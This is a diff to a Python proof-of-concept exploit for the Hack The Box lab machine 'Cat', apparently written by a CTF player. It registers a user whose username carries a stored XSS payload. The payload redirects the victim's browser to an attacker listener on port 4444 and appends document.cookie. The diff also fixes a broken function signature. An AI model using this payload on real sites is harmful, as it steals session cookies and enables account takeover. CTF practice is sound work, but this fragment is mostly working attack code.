@@ -33,14 +33,14 @@ HEADERS = {
 }
 
 BASE_URL = "http://cat.htb"
-XSS_PAYLOAD = "<script>document.location='http://10.10.14.135:4444/?c='+document.cookie;</script>"
+XSS_PAYLOAD = "<script>document.location='http://<ip>:4444/?c='+document.cookie;</script>"
 
 def parse_args():
     parser = argparse.ArgumentParser(description="PoC для XSS в Cat HTB")
     parser.add_argument("--no-proxy", action="store_true", help="Отключить использование прокси")
     return parser.parse_args()
 
-def create_user(password, email, proxies):
+def create_user(username, password, email, proxies):
     log.info("Registering user with XSS payload")
 
     url = f"{BASE_URL}/join.php?username={XSS_PAYLOAD}&email={email}&password={password}&registerForm=Register"
@@ -54,7 +54,7 @@ def create_user(password, email, proxies):
 
     return response
 
-def loginka(, password, proxies):
+def loginka(username, password, proxies):
     log.info("Logging in")
     url = f"{BASE_URL}/join.php?loginUsername={username}&loginPassword={password}&loginForm=Login"
 
